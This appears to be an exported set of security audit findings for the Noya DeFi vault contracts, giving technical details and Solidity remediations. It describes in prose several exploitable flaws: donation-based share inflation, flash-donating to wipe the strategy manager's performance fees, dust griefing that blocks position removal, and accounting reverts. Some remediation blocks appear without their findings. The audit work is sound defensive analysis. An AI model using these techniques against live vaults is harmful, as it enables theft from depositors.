Unlike `BaseConnector._getValue` (lines 253–261), which explicitly guards against zero amounts before querying `valueOracle`:

```solidity
if (amount == 0) {
    return 0;
}
```

neither `AccountingManager.getPositionTVL` (line 636) nor `AccountingManager._getValue` (lines 642–647) checks whether `amount == 0` before calling `valueOracle.getValue(token, base, amount)`.

A registered token holding position can have `amount == 0` in several normal operating scenarios:
1. A connector deposits or supplies its entire balance of `token` into an external protocol without immediately removing the token holding position in `PositionRegistry` (or before `updateTokenInRegistry` is invoked).
2. Due to the swap-and-pop indexing bug in `PositionRegistry.updateHoldingPosition` (lines 351–357, where `calculatorConnector` is hashed instead of `ownerConnector`), a token holding position that was previously shifted in `vault.holdingPositions` cannot be removed by `_updateTokenInRegistry` when its balance drops to `0`, leaving a permanent zero-balance entry in `holdingPositions`.

When `amount == 0` is forwarded to `valueOracle.getValue(token, base, 0)` for any token priced directly or indirectly via an oracle that disallows zero inputs (such as `UniswapValueOracle`, which reverts with `INoyaValueOracle_InvalidInput()` when `amount == 0`), the call reverts. Because `TVLHelper.getTVL` aggregates all holding positions in a loop, a single zero-balance token position causes `AccountingManager.TVL()`, `totalAssets()`, and `getProfit()` to revert.

findings.remediation:
Check for a zero token balance in `AccountingManager.getPositionTVL` (and/or `AccountingManager._getValue`, matching `BaseConnector._getValue`) and return `0` immediately without querying `valueOracle`.

```solidity
    function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
        PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
        if (p.positionTypeId == 0) {
            address token = abi.decode(p.data, (address));
            uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
            if (amount == 0) {
                return 0;
            }
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

findings.technical_details:
In `contracts/accountingManager/AccountingManager.sol`, `totalAssets()` (line 591) and `getProfit()` (line 582) both rely on `TVL()` (lines 627–630) to determine the total value of assets managed by the vault:

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

For token holdings in connectors (positions with `positionTypeId == 0` where `AccountingManager` is registered as the `calculatorConnector`), `TVLHelper.getTVL()` queries `AccountingManager.getPositionTVL()` (lines 632–640):

```solidity
function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
    PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
    if (p.positionTypeId == 0) {
        address token = abi.decode(p.data, (address));
        uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
        return _getValue(token, base, amount);
    }
    return 0;
}
```

Both functions rely on raw `IERC20.balanceOf()` queries:
1. Line 628 reads `baseToken.balanceOf(address(this))` directly on `AccountingManager` and only subtracts `depositQueue.totalAWFDeposit`.
2. Line 636 reads `IERC20(token).balanceOf(connector)` directly on the connector address encoded in `position.data`.

Because neither `AccountingManager` nor the connectors isolate accounted vault funds from unsolicited ERC20 transfers, any external party can increase `TVL()` at any time by transferring `baseToken` directly to `AccountingManager` or transferring a tracked holding `token` directly to an active connector.

This flawed spot-balance valuation impacts two critical mechanisms:
- **ERC4626 Share Conversion (`totalAssets()`):** `AccountingManager` inherits OpenZeppelin's `ERC4626` with the default `_decimalsOffset() == 0` (`1` virtual share and `1` virtual asset) and overrides `totalAssets()` to return `TVL()`. When `calculateDepositShares()` calls `previewDeposit(amount)`, shares are computed as `amount * (totalSupply() + 1) / (TVL() + 1)` rounded down. By donating `baseToken` to `AccountingManager` (or a tracked token to a connector) when `totalSupply()` is small, an attacker inflates `TVL()` so that subsequent depositors receive `0` shares (or severely diluted shares) while their deposited `baseToken` is still absorbed into the vault upon `executeDeposit()`.
- **Profit and Performance Fee Accounting (`getProfit()`):** `getProfit()` computes `TVL() + totalWithdrawnAmount - totalDepositedAmount`. Because `TVL()` reflects raw spot balances rather than tracked deposits/yields, direct token transfers immediately inflate `getProfit()`. An attacker can flash-donate tokens before `recordProfitForFee()` is called so `storedProfitForFee` caches an artificially high profit figure, and then withdraw/stop donating so the subsequent TVL drop triggers `checkIfTVLHasDroped()` to burn all `preformanceFeeSharesWaitingForDistribution` owed to the strategy manager.

findings.remediation:
Track internal accounted balances in `AccountingManager` and connectors rather than relying on raw `IERC20.balanceOf()` queries, and configure a non-zero virtual decimals offset in `ERC4626` to make donation-based share price manipulation economically infeasible.

In `contracts/accountingManager/AccountingManager.sol`, maintain an explicit `trackedBaseTokenBalance` state variable updated only during protocol deposit, withdrawal, and connector liquidity operations (and similarly track held token amounts in `HoldingPI.additionalData` or connector storage instead of querying `IERC20(token).balanceOf`):

```solidity
    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + trackedBaseTokenBalance
            - depositQueue.totalAWFDeposit;
    }

    function getPositionTVL(HoldingPI memory position, address base) public view returns (uint256) {
        PositionBP memory p = registry.getPositionBP(vaultId, position.positionId);
        if (p.positionTypeId == 0) {
            address token = abi.decode(p.data, (address));
            uint256 amount = abi.decode(position.additionalData, (uint256));
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

Track the total calculated deposit amounts (`totalCalculatedDepositAmount`), total calculated deposit shares (`totalCalculatedDepositShares`), total calculated/reserved withdrawal amounts (`currentWithdrawGroup` remaining liability), and total calculated withdrawal shares awaiting execution. Deduct the reserved withdrawal assets (and only uncalculated deposit amounts) in `TVL()`, and adjust the effective share supply used in `_convertToShares` and `_convertToAssets` accordingly.

In `contracts/accountingManager/AccountingManager.sol`:

```solidity
    function TVL() public view returns (uint256) {
        uint256 reservedForWithdraw = currentWithdrawGroup.isFullfilled
            ? currentWithdrawGroup.totalABAmount - currentWithdrawGroup.totalABAmountFullfilled
            : currentWithdrawGroup.totalCBAmount - currentWithdrawGroup.totalCBAmountFullfilled;
        uint256 grossTVL = TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this));
        uint256 deductions = depositQueue.totalAWFDeposit + reservedForWithdraw;
        if (grossTVL <= deductions) {
            return 0;
        }
        return grossTVL - deductions;
    }
```

(Along with subtracting the corresponding calculated withdrawal shares awaiting execution from the effective `totalSupply` in share/asset conversion calculations).

Segregate **all** pending deposits (both deposits awaiting calculation in `[middle, first)` and deposits awaiting execution in `[last, middle)`) from the active vault balance in `TVL()` (and `neededAssetsForWithdraw()`), and ensure `getProfit()` compares `TVL()` only against executed deposits (`totalDepositedAmount` excluding all pending deposits, or by adding pending deposits back when comparing against `totalDepositedAmount`).

Specifically, if `depositQueue.totalAWFDeposit` is updated on `deposit()` (so it represents all unexecuted deposits in `[last, first)`) or tracked alongside uncalculated deposits, `TVL()` will properly exclude all pending deposits whose shares have not yet been minted:

```solidity
    function TVL() public view returns (uint256) {
        return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
            - depositQueue.totalAWFDeposit;
    }
```

Ensure that `depositQueue.totalAWFDeposit` (or a combined `totalPendingDeposits` counter subtracted in `TVL()`) is incremented immediately when `baseToken` is received in `deposit()`, decremented only when shares are minted in `executeDeposit()`, and excluded from `totalDepositedAmount` in `getProfit()` until execution.

findings.technical_details:
In `contracts/accountingManager/AccountingManager.sol`, `TVL()` computes the net asset value of the vault that backs existing shares by summing the net value of all connector holding positions (`TVLHelper.getTVL(vaultId, registry, address(baseToken))`) and the idle `baseToken` held in `AccountingManager` (`baseToken.balanceOf(address(this))`), and then subtracting the pending deposit liability `depositQueue.totalAWFDeposit` (lines 627–630):

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

While other net-value calculations in the protocol guard against insolvency underflows by flooring at zero—specifically `TVLHelper.getTVL()` (lines 30–33: `if (totalTVL < totalDebt) { return 0; }`) and `AccountingManager.getProfit()` (lines 584–587: `if (tvl + totalWithdrawnAmount > totalDepositedAmount)`)—`AccountingManager.TVL()` performs a raw checked subtraction `- depositQueue.totalAWFDeposit`.

Because `AccountingManager` holds all `baseToken` balances in a single unsegregated contract balance (`baseToken.balanceOf(address(this))`), tokens deposited by users awaiting share calculation/execution in `depositQueue.totalAWFDeposit` are commingled with general vault `baseToken` funds. The sum `TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))` can become strictly less than `depositQueue.totalAWFDeposit` in several reachable states:

1. **Commingled `baseToken` outflow followed by connector devaluation:** While `depositQueue.totalAWFDeposit > 0`, `baseToken` held by `AccountingManager` can be transferred out (e.g., to fulfill withdrawal queues or via `rescue`), leaving `baseToken.balanceOf(address(this)) < depositQueue.totalAWFDeposit` because the rest of the vault's value is held in connectors. If connector positions subsequently suffer losses, adverse oracle price movements, or increased debt such that `TVLHelper.getTVL(...) < depositQueue.totalAWFDeposit - baseToken.balanceOf(address(this))`, the minuend becomes smaller than `depositQueue.totalAWFDeposit`.
2. **Deficit between `baseToken.balanceOf(address(this))` and `depositQueue.totalAWFDeposit` when connector TVL is zero:** Whenever `TVLHelper.getTVL(...)` returns `0` (e.g., no active connector positions or connector debt equals/exceeds connector assets) and `baseToken.balanceOf(address(this))` is even 1 wei less than `depositQueue.totalAWFDeposit`, `TVL()` underflows.

When `TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this)) < depositQueue.totalAWFDeposit`, `TVL()` reverts with Panic `0x11` (arithmetic underflow). Because `totalAssets()` (line 591) and `getProfit()` (line 582) both call `TVL()`, any function relying on `TVL()`, `totalAssets()`, ERC4626 share/asset conversion, profit calculation, or TVL-drop checks (`checkIfTVLHasDroped()`) will revert.

findings.remediation:
Check whether the gross TVL (`TVLHelper.getTVL(...) + baseToken.balanceOf(address(this))`) is less than `depositQueue.totalAWFDeposit`, and return `0` if so, matching the pattern used in `TVLHelper.getTVL()` and `AccountingManager.getProfit()`.

```solidity
    function TVL() public view returns (uint256) {
        uint256 totalTVL = TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this));
        if (totalTVL < depositQueue.totalAWFDeposit) {
            return 0;
        }
        return totalTVL - depositQueue.totalAWFDeposit;
    }
```

findings.technical_details:
In Noya's accounting architecture, raw ERC20 token holdings held by connectors are tracked in `PositionRegistry` as `positionTypeId == 0` positions:

1. Whenever a connector inherits from `BaseConnector` and updates its token holdings via `BaseConnector._updateTokenInRegistry(address token, bool remove)` (`contracts/helpers/BaseConnector.sol:135-146`), it fetches the vault's `accountingManager` address from `registry.getVaultAddresses(vaultId)` and computes:
   ```solidity
   bytes32 positionId = registry.calculatePositionId(accountingManager, 0, abi.encode(token));
   ```
   It then calls `registry.updateHoldingPosition(vaultId, positionId, abi.encode(address(this)), "", remove)`.
2. `PositionRegistry.updateHoldingPosition` (`contracts/accountingManager/Registry.sol:312-321`) records a `HoldingPI` entry in `vault.holdingPositions` where:
   - `calculatorConnector` is set to `vaults[vaultId].trustedPositionsBP[_positionId].calculatorConnector` (which is `accountingManager`),
   - `ownerConnector` is set to `msg.sender` (the connector holding the token), and
   - `data` is set to `abi.encode(address(connector))` (the encoded address of the connector holding the token).
3. On the base chain, `accountingManager` is `AccountingManager`. When `AccountingManager.TVL()` (`contracts/accountingManager/AccountingManager.sol:627-630`) calls `TVLHelper.getTVL`, `AccountingManager.getPositionTVL` (`contracts/accountingManager/AccountingManager.sol:632-640`) evaluates `positionTypeId == 0` positions by decoding the token holder's address from `position.data`:
   ```solidity
   address token = abi.decode(p.data, (address));
   uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
   return _getValue(token, base, amount);
   ```
4. On a normal (non-base) chain, `OmnichainManagerNormalChain` is registered as the vault's `accountManager` in `PositionRegistry`. All connectors on the normal chain therefore register their `positionTypeId == 0` holding positions with `calculatorConnector = address(omnichainManagerNormalChain)` and `position.data = abi.encode(address(connector))`.
5. However, `OmnichainManagerNormalChain._getPositionTVL` (`contracts/helpers/OmniChainHandler/OmnichainManagerNormalChain.sol:33-41`) fails to decode `position.data` and instead checks the balance of `address(this)`:
   ```solidity
   if (bp.positionTypeId == 0) {
       address token = abi.decode(bp.data, (address));
       uint256 amount = IERC20(token).balanceOf(address(this));
       return _getValue(token, base, amount);
   }
   ```

As a result:
- **Omitted connector balances**: Any tokens held by other active connectors on the normal chain are ignored, because `IERC20(token).balanceOf(address(omnichainManagerNormalChain))` is queried instead of the connector address encoded in `position.data`.
- **Duplicate asset recognition**: If `OmnichainManagerNormalChain` holds a non-zero balance of `token` while `N` other connectors on the normal chain also hold `token` (creating `N + 1` `HoldingPI` entries in `vault.holdingPositions` for `token`), `TVLHelper.getTVL` calls `OmnichainManagerNormalChain.getPositionTVL` `N + 1` times and counts `OmnichainManagerNormalChain`'s balance `N + 1` times.
- **Corrupted Base-Chain `AccountingManager.TVL()`**: When `OmnichainManagerNormalChain.updateTVLInfo()` sends the normal chain's TVL through `LZHelperSender.updateTVL` and `LZHelperReceiver._lzReceive` to `OmnichainManagerBaseChain.updateTVL`, the inaccurate TVL is recorded in the base chain's `PositionRegistry` under `OMNICHAIN_POSITION_ID` and directly consumed by `AccountingManager.TVL()`, `AccountingManager.totalAssets()`, and `AccountingManager.getProfit()`.

findings.remediation:
Update `OmnichainManagerNormalChain._getPositionTVL` to decode the token holder's address from `position.data`, matching the implementation in `AccountingManager.getPositionTVL`:

```solidity
    function _getPositionTVL(HoldingPI memory position, address base) public view override returns (uint256) {
        PositionBP memory bp = registry.getPositionBP(vaultId, position.positionId);
        if (bp.positionTypeId == 0) {
            address token = abi.decode(bp.data, (address));
            uint256 amount = IERC20(token).balanceOf(abi.decode(position.data, (address)));
            return _getValue(token, base, amount);
        }
        return 0;
    }
```

Track only uncalculated deposits (or separately track calculated deposits whose shares have already been minted) and unpaid calculated withdrawals (whose shares have already been burned), and adjust `TVL()` accordingly so that `TVL()` always matches the assets backing the currently circulating `totalSupply()`:

```solidity
    function TVL() public view returns (uint256) {
        uint256 totalAssetsValue = TVLHelper.getTVL(vaultId, registry, address(baseToken))
            + baseToken.balanceOf(address(this));
        uint256 liabilities = depositQueue.totalAWFDeposit + unpaidCalculatedWithdrawals;
        if (totalAssetsValue <= liabilities) {
            return 0;
        }
        return totalAssetsValue - liabilities;
    }
```

Ensure `depositQueue.totalAWFDeposit` is decremented when shares are minted in `calculateDepositShares()` (rather than waiting until `executeDeposit()`), and `unpaidCalculatedWithdrawals` is incremented when shares are burned in `calculateWithdrawShares()` and decremented when `baseToken` is paid out in `executeWithdraw()`.

findings.technical_details:
`AccountingManager.TVL()` calculates the vault's net asset value by summing the value of all active holding positions reported by `TVLHelper.getTVL(vaultId, registry, address(baseToken))` and the idle `baseToken` held directly by `AccountingManager` (minus queued deposits waiting for execution):

```solidity
function TVL() public view returns (uint256) {
    return TVLHelper.getTVL(vaultId, registry, address(baseToken)) + baseToken.balanceOf(address(this))
        - depositQueue.totalAWFDeposit;
}
```

Inside `TVLHelper.getTVL` (`contracts/helpers/TVLHelper.sol`, lines 22–34), the library iterates over all `HoldingPI` entries for `vaultId`, accumulating non-debt position values into `totalTVL` and debt position values (`registry.isPositionDebt(vaultId, positions[i].positionId) == true`) into `totalDebt`. At lines 30–32, if `totalTVL < totalDebt`, `getTVL` returns `0`:

```solidity
if (totalTVL < totalDebt) {
    return 0;
}
return (totalTVL - totalDebt);
```

Because `TVLHelper.getTVL` nets assets and liabilities locally and floors the result at `0` before returning across the aggregation boundary to `AccountingManager.TVL()` (or cross-chain via `OmnichainManagerNormalChain.getTVL()`), any net liability (`totalDebt - totalTVL`) is lost.

Specifically, whenever borrowed funds (recorded as a debt position in `holdingPositions`) are transferred to `AccountingManager` (for example, to fulfill user withdrawals) or whenever the value of non-debt holding positions in connectors drops below `totalDebt` while `AccountingManager` holds `baseToken` reserves, `TVLHelper.getTVL` returns `0` instead of propagating the net liability. `AccountingManager.TVL()` then returns `baseToken.balanceOf(address(this)) - depositQueue.totalAWFDeposit` without subtracting `totalDebt - totalTVL`, inflating the vault's reported TVL and share price.

findings.remediation:
Return both `totalTVL` and `totalDebt` (or a signed net value) from `TVLHelper.getTVL` so that `AccountingManager.TVL()` can include its own `baseToken` balance before subtracting `totalDebt`, clamping to `0` only after all vault assets and liabilities have been aggregated.

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken)
        public
        view
        returns (uint256 totalTVL, uint256 totalDebt)
    {
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            if (positions[i].calculatorConnector == address(0)) {
                continue;
            }
            uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
            bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
            if (isPositionDebt) {
                totalDebt += tvl;
            } else {
                totalTVL += tvl;
            }
        }
    }
```

In `AccountingManager.TVL()`:

```solidity
    function TVL() public view returns (uint256) {
        (uint256 totalTVL, uint256 totalDebt) = TVLHelper.getTVL(vaultId, registry, address(baseToken));
        uint256 totalAssets = totalTVL + baseToken.balanceOf(address(this));
        uint256 totalLiabilities = totalDebt + depositQueue.totalAWFDeposit;
        if (totalAssets <= totalLiabilities) {
            return 0;
        }
        return totalAssets - totalLiabilities;
    }
```

In `PositionRegistry.updateHoldingPosition` (`contracts/accountingManager/Registry.sol`), use `ownerConnector` instead of `calculatorConnector` when updating `vault.isPositionUsed` for the swapped holding position:

```solidity
        if (removePosition) {
            if (positionIndex < vault.holdingPositions.length - 1) {
                vault.holdingPositions[positionIndex] = vault.holdingPositions[vault.holdingPositions.length - 1];
                vault.isPositionUsed[keccak256(
                    abi.encode(
                        vault.holdingPositions[positionIndex].ownerConnector,
                        vault.holdingPositions[positionIndex].positionId,
                        vault.holdingPositions[positionIndex].data
                    )
                )] = positionIndex;
            }
            vault.holdingPositions.pop();
            vault.isPositionUsed[holdingPositionId] = 0;
            emit HoldingPositionUpdated(vaultId, _positionId, _data, additionalData, removePosition, positionIndex);
            return type(uint256).max;
        }
```

Withdraw the minted `usdToken` from `SNXCoreProxy` to the connector upon minting, deposit `usdToken` from the connector into `SNXCoreProxy` before burning, and account for the position's debt in `_getPositionTVL`:

```solidity
    function mintOrBurnSUSD(
        uint256 _amount,
        uint128 _accountId,
        uint128 poolId,
        address collateralType,
        bool mintOrBurn
    ) public onlyManager {
        address usdToken = SNXCoreProxy.getUsdToken();
        if (mintOrBurn) {
            SNXCoreProxy.mintUsd(_accountId, poolId, collateralType, _amount);
            SNXCoreProxy.withdraw(_accountId, usdToken, _amount);
        } else {
            _approveOperations(usdToken, address(SNXCoreProxy), _amount);
            SNXCoreProxy.deposit(_accountId, usdToken, _amount);
            SNXCoreProxy.burnUsd(_accountId, poolId, collateralType, _amount);
        }
        _updateTokenInRegistry(collateralType);
        _updateTokenInRegistry(usdToken);
    }

    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256 tvl) {
        (uint128 accountId, uint128 poolId, address collateralType) = abi.decode(p.data, (uint128, uint128, address));
        (uint256 totalDeposited,,) = SNXCoreProxy.getAccountCollateral(accountId, collateralType);
        uint256 collateralValue = _getValue(collateralType, base, totalDeposited);
        int256 debt = SNXCoreProxy.getPositionDebt(accountId, poolId, collateralType);
        if (debt > 0) {
            uint256 debtValue = _getValue(SNXCoreProxy.getUsdToken(), base, uint256(debt));
            return collateralValue > debtValue ? collateralValue - debtValue : 0;
        } else if (debt < 0) {
            uint256 creditValue = _getValue(SNXCoreProxy.getUsdToken(), base, uint256(-debt));
            return collateralValue + creditValue;
        }
        return collateralValue;
    }
```

Track the `( _accountId, poolId, collateralType )` debt position in `PositionRegistry` when minting or burning sUSD (marked as `isDebt = true` in `trustedPositionsBP`, or by encoding `poolId` in the position data and subtracting the position debt in `_getPositionTVL`).

```solidity
    function mintOrBurnSUSD(
        uint256 _amount,
        uint128 _accountId,
        uint128 poolId,
        address collateralType,
        bool mintOrBurn
    ) public onlyManager {
        address usdToken = SNXCoreProxy.getUsdToken();
        if (mintOrBurn) {
            SNXCoreProxy.mintUsd(_accountId, poolId, collateralType, _amount);
        } else {
            _approveOperations(usdToken, address(SNXCoreProxy), _amount);
            SNXCoreProxy.burnUsd(_accountId, poolId, collateralType, _amount);
        }
        bytes32 positionId = registry.calculatePositionId(address(this), SNX_POSITION_ID, "");
        registry.updateHoldingPosition(
            vaultId, positionId, abi.encode(_accountId, collateralType), abi.encode(poolId), false
        );
        _updateTokenInRegistry(collateralType);
        _updateTokenInRegistry(usdToken);
    }

    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256 tvl) {
        (uint128 accountId, address collateralType) = abi.decode(p.data, (uint128, address));
        (uint256 totalDeposited,,) = SNXCoreProxy.getAccountCollateral(accountId, collateralType);
        uint256 collateralValue = _getValue(collateralType, base, totalDeposited);
        if (p.additionalData.length > 0) {
            uint128 poolId = abi.decode(p.additionalData, (uint128));
            int256 debt = SNXCoreProxy.getPositionDebt(accountId, poolId, collateralType);
            if (debt > 0) {
                uint256 debtValue = _getValue(SNXCoreProxy.getUsdToken(), base, uint256(debt));
                return collateralValue > debtValue ? collateralValue - debtValue : 0;
            }
        }
        tvl = collateralValue;
    }
```

findings.technical_details:
`SNXConnector._getPositionTVL` (lines 121–126 of `contracts/connectors/SNXConnector.sol`) queries Synthetix V3's `IV3CoreProxy.getAccountCollateral(accountId, collateralType)` to determine the value of the collateral held in the account:

```solidity
function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256 tvl) {
    (uint128 accountId, address collateralType) = abi.decode(p.data, (uint128, address));
    (uint256 totalDeposited, uint256 totalAssigned, uint256 totalLocked) =
        SNXCoreProxy.getAccountCollateral(accountId, collateralType);
    tvl = _getValue(collateralType, base, totalDeposited + totalAssigned);
}
```

In Synthetix V3, `getAccountCollateral` returns:
- `totalDeposited`: The total collateral associated with the account, which is the sum of unassigned (available) collateral and collateral delegated (assigned) to pools (`availableCollateral + totalAssigned`).
- `totalAssigned`: The portion of `totalDeposited` currently delegated to liquidity pools.
- `totalLocked`: The portion of collateral subject to withdrawal locks.

When collateral is deposited into a Synthetix V3 account, `totalDeposited` increases by the deposited amount and `totalAssigned` is `0`. When that collateral is subsequently delegated to a pool via `delegateCollateral`, `totalAssigned` increases by the delegated amount while `totalDeposited` remains unchanged (as `availableCollateral` decreases by the same amount).

By passing `totalDeposited + totalAssigned` into `_getValue`, `_getPositionTVL` aggregates overlapping balances and counts all delegated collateral twice. Whenever a vault delegates collateral to a Synthetix V3 pool, the position TVL reported to `TVLHelper.getTVL` and `AccountingManager.TVL` is overstated by up to 100% of the delegated collateral value.

findings.remediation:
Use only `totalDeposited` (without adding `totalAssigned`) as the total collateral amount when computing the position's value in `_getPositionTVL`.

```solidity
    function _getPositionTVL(HoldingPI memory p, address base) public view override returns (uint256 tvl) {
        (uint128 accountId, address collateralType) = abi.decode(p.data, (uint128, address));
        (uint256 totalDeposited,,) = SNXCoreProxy.getAccountCollateral(accountId, collateralType);
        tvl = _getValue(collateralType, base, totalDeposited);
    }
```

findings.technical_details:
In `BaseConnector.sol`, token holding positions are tracked in `PositionRegistry` via `_updateTokenInRegistry`:

```solidity
function updateTokenInRegistry(address token) public onlyManager {
    _updateTokenInRegistry(token);
}

function _updateTokenInRegistry(address token) internal {
    _updateTokenInRegistry(token, IERC20(token).balanceOf(address(this)) == 0);
}
```

When `_updateTokenInRegistry(address token, bool remove)` is invoked (Line 135), it calculates the token's `positionId` (using `accountingManager` as the `calculatorConnector` and `0` as the `positionTypeId`) and checks the current `positionIndex` in `PositionRegistry`:

- If `positionIndex == 0 && !remove`, it calls `registry.updateHoldingPosition(..., remove = false)` to append a new `HoldingPI` entry to `vault.holdingPositions`.
- If `positionIndex > 0 && remove`, it calls `registry.updateHoldingPosition(..., remove = true)` to pop the `HoldingPI` entry from `vault.holdingPositions`.

Because `remove` is set to `IERC20(token).balanceOf(address(this)) == 0` on Line 159, the lifecycle of a holding position in the registry depends directly on the raw `ERC20.balanceOf(address(this))` being strictly zero. This creates two closely related issues:

1. **Unsolicited Dust Donations Prevent Position Removal:** Any external actor can transfer 1 wei of an ERC20 token directly to a `BaseConnector` instance. When the connector subsequently transfers out its entire intended token balance via `sendTokensToTrustedAddress`, `swapHoldings`, or when the manager calls `updateTokenInRegistry(token)`, `IERC20(token).balanceOf(address(this))` remains `>= 1`. As a result, `IERC20(token).balanceOf(address(this)) == 0` evaluates to `false`, and the holding position is never removed from `vault.holdingPositions`.
2. **Residual Dust and Rebasing Rounding:** Even without active griefing, rebasing tokens (such as stETH) or swap/withdrawal rounding often leave a residual balance of `1` wei (note that `uint256 public DUST_LEVEL = 1` is declared at Line 31 of `BaseConnector.sol` but is unused in `_updateTokenInRegistry`), permanently retaining the holding position in the registry.

In `PositionRegistry.sol`, each vault enforces a strict cap on the total number of active holding positions across all connectors (`maxNumHoldingPositions`, set to 20 by default and capped at `MAX_NUM_HOLDING_POSITIONS = 40` on Lines 21-23):

```solidity
if (vault.holdingPositions.length >= maxNumHoldingPositions) {
    revert TooManyPositions();
}
```

Additionally, `PositionRegistry.removeTrustedPosition` (Lines 274-278) reverts with `CannotRemovePosition` if any entry in `vault.holdingPositions` still references `_positionId`. By keeping token balances non-zero across connectors, holding positions cannot be removed, locking trusted positions and exhausting `maxNumHoldingPositions`.

findings.remediation:
Track the connector's accounted token balance internally or allow the manager to specify/sweep dust balances, and use a configurable dust threshold (or internal accounting) when determining whether a token position should be considered empty in `_updateTokenInRegistry`. Additionally, allow the manager to sweep unsolicited residual dust or force-update the registry when the balance is below the dust threshold:

```solidity
    mapping(address => uint256) public tokenDustLevel;

    function setTokenDustLevel(address token, uint256 dustLevel) external onlyMaintainer {
        tokenDustLevel[token] = dustLevel;
    }

    function updateTokenInRegistry(address token) public onlyManager {
        _updateTokenInRegistry(token);
    }

    /// @notice adds or removes the token position to the registry based on the balance of the token
    function _updateTokenInRegistry(address token) internal {
        uint256 dust = tokenDustLevel[token];
        if (dust == 0) {
            dust = DUST_LEVEL;
        }
        _updateTokenInRegistry(token, IERC20(token).balanceOf(address(this)) <= dust);
    }
```

findings.technical_details:
In `contracts/helpers/TVLHelper.sol`, `getTVL` aggregates the total assets and debt of a vault by iterating through all entries returned by `registry.getHoldingPositions(vaultId)`:

```solidity
for (uint256 i = 0; i < positions.length; i++) {
    if (positions[i].calculatorConnector == address(0)) {
        continue;
    }
    uint256 tvl = IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken);
    bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
    if (isPositionDebt) {
        totalDebt += tvl;
    } else {
        totalTVL += tvl;
    }
}
```

At line 22, `getTVL` executes a direct external static call to `IConnector(positions[i].calculatorConnector).getPositionTVL(positions[i], baseToken)` for every holding position in the array (up to `MAX_NUM_HOLDING_POSITIONS = 40`).

Each connector's `getPositionTVL` implementation relies on `BaseConnector._getValue`, which queries `NoyaValueOracle.getValue(token, baseToken, amount)`. `NoyaValueOracle` resolves single-hop or multi-hop `priceRoutes` across underlying oracle connectors such as `ChainlinkOracleConnector` and `UniswapValueOracle`. These external valuation dependencies revert under several operational and lifecycle conditions:
1. **Individual Position Oracle Unavailability or Stale Feeds:** `ChainlinkOracleConnector` enforces a strict staleness threshold (`chainlinkPriceAgeThreshold = 2 hours`) and reverts when any single asset's feed has not updated within that window. Similarly, `UniswapValueOracle` reverts if `IUniswapV3Pool.observe` fails (e.g., insufficient observation cardinality or pool history).
2. **Dependency Lifecycle Changes:** When maintainers update oracle sources (`updateDefaultPriceSource`, `updateAssetPriceSource`, `updatePriceRoute`) or disable a connector via `PositionRegistry.addConnector` while a holding position (including a dust token balance above `DUST_LEVEL` or an unclosed position) remains registered in `holdingPositions`, `NoyaValueOracle._getValue` reverts with `NoyaOracle_PriceOracleUnavailable` or the connector call fails.
3. **Cumulative External Valuation Execution Costs:** Iterating through up to 40 holding positions where each position triggers external connector calls, external protocol state reads, and multi-hop oracle route evaluations compounds execution gas costs linearly with the number of active positions.

Because `TVLHelper.getTVL` lacks fault handling, staleness fallbacks, or connector lifecycle checks, a revert in any single holding position's valuation dependency unconditionally aborts the entire `getTVL` calculation.

findings.remediation:
Implement fault handling and availability checks when querying individual positions in `TVLHelper.getTVL`, or provide a cached/fallback valuation mechanism for non-debt positions whose connectors are disabled or whose external valuation calls fail, while ensuring debt positions still fail safely so vault solvency cannot be overstated.

```solidity
    function getTVL(uint256 vaultId, PositionRegistry registry, address baseToken) public view returns (uint256) {
        uint256 totalTVL;
        uint256 totalDebt;
        HoldingPI[] memory positions = registry.getHoldingPositions(vaultId);
        for (uint256 i = 0; i < positions.length; i++) {
            address calculator = positions[i].calculatorConnector;
            if (calculator == address(0)) {
                continue;
            }
            bool isPositionDebt = registry.isPositionDebt(vaultId, positions[i].positionId);
            if (!isPositionDebt && !registry.isAnActiveConnector(vaultId, calculator)) {
                continue;
            }
            try IConnector(calculator).getPositionTVL(positions[i], baseToken) returns (uint256 tvl) {
                if (isPositionDebt) {
                    totalDebt += tvl;
                } else {
                    totalTVL += tvl;
                }
            } catch (bytes memory err) {
                if (isPositionDebt) {
                    assembly {
                        revert(add(err, 0x20), mload(err))
                    }
                }
            }
        }
        if (totalTVL < totalDebt) {
            return 0;
        }
        return (totalTVL - totalDebt);
    }
```

findings.technical_details:
`AccountingManager.calculateDepositShares` (line 230) and `AccountingManager.calculateWithdrawShares` (line 333) rely on `TVLHelper.getLatestUpdateTime(vaultId, registry)` to determine `oldestUpdateTime`, the oldest valuation timestamp across all active holding positions in the vault. Deposit and withdrawal requests are only eligible for share/asset calculation if `recordTime <= oldestUpdateTime` (lines 233 and 339), ensuring that queued requests are priced against a TVL snapshot updated after the request was recorded.

